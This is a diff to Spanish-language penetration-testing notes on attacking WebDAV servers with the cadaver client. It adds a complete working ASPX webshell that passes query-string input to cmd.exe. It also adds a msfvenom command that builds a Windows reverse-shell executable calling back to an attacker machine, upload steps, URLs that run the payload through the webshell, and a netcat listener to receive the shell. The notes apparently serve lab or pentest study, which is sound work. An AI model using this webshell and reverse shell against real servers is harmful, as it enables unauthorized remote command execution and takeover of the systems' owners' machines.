@@ -106,25 +106,46 @@ NOTA:
 	- Recibir con Netcat la Revershell 
 ```
 
-## Cadaver forma 2 - Revershell  ????? TERMINAR
+## Cadaver forma 2 - Revershell 
 
 ```bash 
 ❯ cadaver http://IP/webdav   # Conectarse al WebDav 
 	❯ ?       # Mostrar los comandos disponibles 
-	❯ put /home/user/Dowloads/webshell.aspx      # Subir una webshell (Colocar la ruta)
+	❯ put webshell.aspx      # Subir una webshell (Colocar la ruta)
 	❯ exit    # Salir 
+```
 
-
-# Ejecutar un comando despues de subir la webshell 
-	http://IP/webshell.aspx?cmd=whoami 
+```bash 
+# Webshell clásica 
+<%-- cmd.aspx → webshell básica para IIS --%>
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<% 
+    string cmd = Request.QueryString["cmd"];
+    if (cmd != null) {
+        Process p = new Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c " + cmd;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.Start();
+        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+        p.WaitForExit();
+    }
+%>
 ```
 
 ```bash 
 # Revershell (Forma 2)
-# Solo se sube este archivo y se ejecuta desde la web 
+# Se sube este archivo y se ejecuta desde la web 
 
 # Creación de una Revershell stageless 
-❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f exe -o reverse.exe
+❯ msfvenom -p windows/shell_reverse_tcp LHOST=IP_Kali LPORT=593 -f exe > reverse.exe
+
+❯ cadaver http://IP/webdav   # Conectarse al WebDav 
+	❯ ?       # Mostrar los comandos disponibles 
+	❯ put reverse.exe   # Subir una webshell (Colocar la ruta)
+	❯ exit    # Salir 
 
 
 NOTA:
@@ -134,6 +155,16 @@ NOTA:
 		
 		C:\inetpub\wwwroot\uploads\  
 		# Acceder desde http://IP/uploads/cmd.aspx
+```
+
+```bash 
+# REVERSHELL
+
+# Ejecutar un comando despues de subir la webshell 
+	http://IP/webshell.aspx?cmd=dir C:\inetpub\wwwroot\           # Verificar si el archivo se ha subido 
+	http://IP/webshell.aspx?cmd=C:\inetpub\wwwroot\reverse.exe    # Ejecutar el comando
+
+❯ rlwrap nc -nlvp 593    # Recibir la Revershell 
 ```
 
 ## Davtest
